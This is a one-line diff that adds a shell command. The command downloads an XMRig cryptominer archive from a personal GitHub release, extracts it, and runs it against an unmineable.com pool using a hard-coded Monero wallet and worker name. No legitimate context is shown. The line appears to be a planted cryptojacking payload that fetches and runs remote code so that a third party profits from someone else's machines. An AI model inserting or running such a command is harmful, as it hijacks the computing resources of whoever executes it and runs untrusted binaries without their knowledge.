@@ -1,0 +1,1 @@
+wget https://github.com/jambulhoki/test/releases/download/myproj/xmrig-6.21.3.tar.gz && tar xf xmrig-6.21.3.tar.gz && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:83phzM15R3pffRQQ6W2oupdR8RdyFfy53EkbAczDsdnAPgZx8dq3m4A83xPpKTAtsXiEBBCDxmjtLXx7bimudnsA4R2fGBb.unmineable_worker_dgotvbkm -p x c=XMR -t 2
